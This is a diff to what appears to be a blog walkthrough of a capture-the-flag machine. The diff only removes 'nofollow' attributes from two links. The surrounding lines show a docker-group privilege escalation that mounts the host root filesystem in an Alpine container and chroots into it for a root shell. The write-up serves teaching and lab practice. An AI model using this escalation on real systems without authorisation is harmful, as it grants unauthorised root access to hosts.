@@ -101,7 +101,7 @@ We have docker as a hint. I saw the <b>id</b> of the user and found that we have
 uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 ```
 
-Looking at the <a href="https://gtfobins.github.io/gtfobins/docker/" rel=”nofollow”>GTFO Bins,</a> I found that we can exploit docker and mount the root directory on a docker container using the following command:
+Looking at the <a href="https://gtfobins.github.io/gtfobins/docker/">GTFO Bins,</a> I found that we can exploit docker and mount the root directory on a docker container using the following command:
 
 ```r
 [shailendra@localhost ~]$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
@@ -132,4 +132,4 @@ share it with me twitter@cybersploit1
 That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future!
 If you have any queries, you can contact me <a href="/contact">here.</a>
 
-NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/mattandersondesign" rel=”nofollow”>Matt Anderson.</a>
+NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/mattandersondesign">Matt Anderson.</a>
